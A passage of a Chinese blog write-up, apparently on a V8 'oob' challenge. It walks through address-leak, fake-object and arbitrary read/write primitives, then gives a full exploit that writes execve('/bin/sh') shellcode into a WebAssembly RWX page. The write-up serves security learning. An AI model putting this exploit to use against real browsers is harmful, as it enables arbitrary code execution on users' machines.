class="line"></span><br></pre></td></tr></table></figure>
+<p>调用a.oob(1)后，如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x38758e50dd20 10</span><br><span class="line">00:0000│  0x38758e50dd20 —▸ 0x216327600851 ◂— 0x2163276001</span><br><span class="line">01:0008│  0x38758e50dd28 ◂— 0x500000000</span><br><span class="line">02:0010│  0x38758e50dd30 ◂— 0x100000000</span><br><span class="line">03:0018│  0x38758e50dd38 ◂— 0x200000000</span><br><span class="line">04:0020│  0x38758e50dd40 ◂— 0x300000000</span><br><span class="line">05:0028│  0x38758e50dd48 ◂— 0x400000000</span><br><span class="line">06:0030│  0x38758e50dd50 ◂— 0x500000000</span><br><span class="line">07:0038│  0x38758e50dd58 ◂— 0x3ff0000000000000</span><br><span class="line">08:0040│  0x38758e50dd60 ◂— 0x400000000</span><br></pre></td></tr></table></figure>
+<p>可以看到a[len]被设置成了浮点数的16进制，<br>在浏览器中有两种方式getshell:<br>    1.leak libc 最后system(‘/bin/sh’);<br>    2.使用wasm执行shellcode</p>
+<h2 id="leak-address"><a href="#leak-address" class="headerlink" title="leak address"></a>leak address</h2><p>现在漏洞点有任意地址读和写，利用条件:<br>  1.数组(所有类型的数组，不仅是int、double还可以是对象数组)<br>  2.任意地址读读的是最后一个元素所在值后的8bytes<br>  3.任意地址写写的是最后一个元素所在值后的8bytes<br>思路如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_obj_address</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  c[<span class="number">0</span>] = obj;</span><br><span class="line">  <span class="keyword">var</span> d = c.oob(); <span class="comment">//get c right map  </span></span><br><span class="line">  c.oob(a.oob()); <span class="comment">//edit c map to a,so c == a;</span></span><br><span class="line">  <span class="keyword">var</span> tmp = c[<span class="number">0</span>]; <span class="comment">// get obj address;</span></span><br><span class="line">  c.oob(d);</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> leak_ad = leak_obj_address(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;leak_obj: 0x&quot;</span> + hex(ftoi(leak_ad)));</span><br><span class="line"><span class="comment">//由于对象数组的element在对象数组map属性上方，可以利用这一点得到浮点数组的map并将对象数组的map修改为浮点数组，对象数组中对象的地址就当作</span></span><br><span class="line"><span class="comment">//浮点数泄露，至于为什么使用浮点数组，结合d8调试一下就知道了，最后再复原对象数组的map</span></span><br></pre></td></tr></table></figure>
+<p>然后考虑如何任意地址读，上面的leak_obj_address是泄露obj_ad，这里假设有address，需要泄露*address，这时就需要写一个通用的泄露函数<br>如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//V8中泄露地址，思路和上面一样，任意地址泄露需要能控制element的值，采用伪造obj的方式就可以控制element处的值</span></span><br><span class="line"><span class="keyword">var</span> obj = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_map = obj.oob();</span><br><span class="line"><span class="keyword">var</span> fake_obj = [a_map,itof(<span class="number">0n</span>),itof(<span class="number">0x11111n</span>),itof(<span class="number">0x1000000000n</span>),<span class="number">1.1</span>,<span class="number">2.2</span>];<span class="comment">//a_map是浮点数组的map</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_obj_create</span>(<span class="params">ad_to_fake_object</span>) </span>&#123; <span class="comment">//return obj</span></span><br><span class="line"></span><br><span class="line">  obj[<span class="number">0</span>] = itof(ad_to_fake_object);</span><br><span class="line">  obj.oob(c_map); <span class="comment">//这一步是关键，原本是浮点数组的obj，此时变成了对象数组，而obj[0]处的值为a_map - 2.2处的地址，即伪造出的内容被当成对象传递给aaa，然后返回得到伪造的对象</span></span><br><span class="line">  <span class="keyword">let</span> aaa = obj[<span class="number">0</span>];</span><br><span class="line">  obj.oob(obj_map);</span><br><span class="line">  <span class="keyword">return</span> aaa;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_ad = leak_obj_address(fake_obj);</span><br><span class="line"><span class="keyword">var</span> tmp = fake_obj_ad - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_obj1 = fake_obj_create(tmp);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_any</span>(<span class="params">ad</span>) </span>&#123;</span><br><span class="line">  fake_obj[<span class="number">2</span>] = itof(ad - <span class="number">0x10n</span>);</span><br><span class="line">  <span class="keyword">var</span> leak_ad = ftoi(fake_obj1[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> leak_ad;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>任意写类似任意读，然后是使用wasm得到rwx_ad + 写shellcode(在线网站:<a target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/">https://wasdk.github.io/WasmFiddle/</a>)<br>最后的exp如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(f64.buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a];</span><br><span class="line"><span class="keyword">var</span> a_map = a.oob();</span><br><span class="line"><span class="keyword">var</span> c_map = c.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_obj_address</span>(<span class="params">obj</span>) </span>&#123; <span class="comment">//return float</span></span><br><span class="line">  c[<span class="number">0</span>] = obj;</span><br><span class="line">  <span class="keyword">var</span> d = c.oob(); <span class="comment">//get c right map  </span></span><br><span class="line">  c.oob(a.oob()); <span class="comment">//edit c map to a,so c == a;</span></span><br><span class="line">  <span class="keyword">var</span> tmp = ftoi(c[<span class="number">0</span>]); <span class="comment">// get obj address;</span></span><br><span class="line">  c.oob(d);</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_map = obj.oob();</span><br><span class="line"><span class="keyword">var</span> fake_obj = [a_map,itof(<span class="number">0n</span>),itof(<span class="number">0x11111n</span>),itof(<span class="number">0x1000000000n</span>),<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_obj_create</span>(<span class="params">ad_to_fake_object</span>) </span>&#123; <span class="comment">//return obj</span></span><br><span class="line"></span><br><span class="line">  obj[<span class="number">0</span>] = itof(ad_to_fake_object);</span><br><span class="line">  obj.oob(c_map);</span><br><span class="line">  <span class="keyword">let</span> aaa = obj[<span class="number">0</span>];</span><br><span class="line">  obj.oob(obj_map);</span><br><span class="line">  <span class="keyword">return</span> aaa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_ad = leak_obj_address(fake_obj);</span><br><span class="line"><span class="keyword">var</span> tmp = fake_obj_ad - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_obj1 = fake_obj_create(tmp);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_any</span>(<span class="params">ad</span>) </span>&#123;</span><br><span class="line">  fake_obj[<span class="number">2</span>] = itof(ad - <span class="number">0x10n</span>);</span><br><span class="line">  <span class="keyword">var</span> leak_ad = ftoi(fake_obj1[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> leak_ad;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_any</span>(<span class="params">ad,data</span>) </span>&#123;</span><br><span class="line">  fake_obj[<span class="number">2</span>] = itof(ad - <span class="number">0x10n</span>);</span><br><span class="line">  fake_obj1[<span class="number">0</span>] = itof(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> d = leak_obj_address(f);</span><br><span class="line"><span class="keyword">var</span> sharefunctioninfo = write_any(d + <span class="number">0x18n</span>);</span><br><span class="line"><span class="keyword">var</span> wasmexportedfunctiondata = write_any(sharefunctioninfo + <span class="number">0x8n</span>);</span><br><span class="line"><span class="keyword">var</span> instance = write_any(wasmexportedfunctiondata + <span class="number">0x10n</span>);</span><br><span class="line"><span class="keyword">var</span> rwx_page = write_any(instance + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;leak_wasm: 0x&quot;</span> + hex(d));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;share_ad: 0x&quot;</span> + hex(sharefunctioninfo));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;data: 0x&quot;</span> + hex(wasmexportedfunctiondata));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;instance: 0x&quot;</span> + hex(instance));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;rwx_page: 0x&quot;</span> + hex(rwx_page));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> addr = leak_obj_address(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line"><span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line"><span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line"><span class="number">0x050fd231583b6an</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">read_any(addr,rwx_page);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;leak: 0x&quot;</span> + hex(addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    data_view.setBigUint64(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<p>测试<br><img src="/images/2022-05-17113225.png" alt="avatar"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/v8/" rel="tag"># v8</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/09/csapplab4-8/" rel="next" title="csapplab 4 -  9">
+                <i class="fa fa-chevron-left"></i> csapplab 4 -  9
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1652601666778.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiquanmuhua.github.io/" title="muhua" target="_blank">muhua</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tianmai1.github.io/" title="tianmai" target="_blank">tianmai</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://makabaka-yyds.github.io/" title="makabaka" target="_blank">makabaka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lucifer-rossweisse.github.io/" title="Rossweisse" target="_blank">Rossweisse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lemonprefect.cn/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7"><span class="nav-number">2.</span> <span class="nav-text">调试技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#diff%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">diff文件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-address"><span class="nav-number">4.</span> <span class="nav-text">leak address</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Archer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" rel="external nofollow noopener" target="_blank" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Gemini
+  </a>
+**  <span id="busuanzi_container_site_pv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  <span id="busuanzi_container_site_uv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+**
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("LbPELecNVT4mCuCTYHSU2wzm-gzGzoHsz", "iRokzKJjxE22Vs6iknD1dqGA");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
